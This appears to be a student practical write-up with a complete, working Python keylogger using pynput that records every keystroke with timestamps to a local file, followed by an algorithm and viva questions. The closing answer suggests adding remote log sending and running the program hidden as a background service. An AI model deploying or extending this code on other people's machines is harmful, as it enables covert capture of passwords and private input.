# mesh

### Key Logger

```python
from pynput.keyboard import Key, Listener
import logging

# if no name it gets into an empty string
log_dir = ""

# basic logging configuration
logging.basicConfig(
    filename=(log_dir + "key_log.txt"),
    level=logging.DEBUG,
    format='%(asctime)s:%(message)s:'
)

# function triggered when a key is pressed
def on_press(key):
    logging.info(str(key))

# start listening for keyboard input
with Listener(on_press=on_press) as listener:
    listener.join()
```

# Practical – Key Logger using Python

## Algorithm

1. Import required modules (`pynput.keyboard` and `logging`).
2. Set the directory where the log file will be stored.
3. Configure logging with:
   - File name
   - Logging level
   - Log format (time and key pressed).
4. Define a function `on_press(key)` that runs whenever a key is pressed.
5. Convert the key to string format.
6. Store the pressed key in the log file using `logging.info()`.
7. Start a keyboard listener using `Listener`.
8. Continuously monitor keyboard input until the program is stopped.
9. Save all keystrokes with timestamps in `key_log.txt`.

---

# Possible Viva Questions with Answers

## 1. What is a keylogger?
A keylogger is a program that records every key pressed on a keyboard and stores it in a file for later analysis.

## 2. What is the purpose of a keylogger?
It is used for monitoring user activity, security testing, debugging input systems, or in ethical hacking demonstrations.

## 3. Which library is used in this program to capture keystrokes?
The `pynput` library is used to monitor keyboard events.

## 4. What does `Listener` do?
`Listener` listens for keyboard events such as key presses and triggers a function when they occur.

## 5. What is the role of the `on_press` function?
It executes whenever a key is pressed and records the key into the log file.

## 6. Why is the `logging` module used?
The `logging` module is used to store captured keystrokes into a file with timestamps.

## 7. What does `logging.basicConfig()` do?
It sets up the configuration for logging such as file name, log level, and message format.

## 8. What does `level=logging.DEBUG` mean?
It allows logging of all messages including debug level messages.

## 9. What does `listener.join()` do?
It keeps the program running and continuously listening for keyboard inputs.

## 10. What file stores the keystrokes?
The keystrokes are stored in `key_log.txt`.

## 11. Why is `str(key)` used?
Because keys are objects and must be converted to string format before storing.

## 12. What type of event does this program detect?
It detects keyboard press events.

## 13. Can this program detect special keys like Enter or Shift?
Yes, `pynput` captures both normal keys and special keys.

## 14. Is keylogging legal?
Keylogging is legal only when used with permission for security testing, monitoring, or educational purposes.

## 15. What are the limitations of this keylogger?
- It runs locally on the machine
- It does not send data remotely
- It stops when the program is terminated

## 16. How can this program be improved?
It can be improved by:
- Adding remote log sending
- Encrypting stored logs
- Filtering unwanted keys
- Running in background as a service
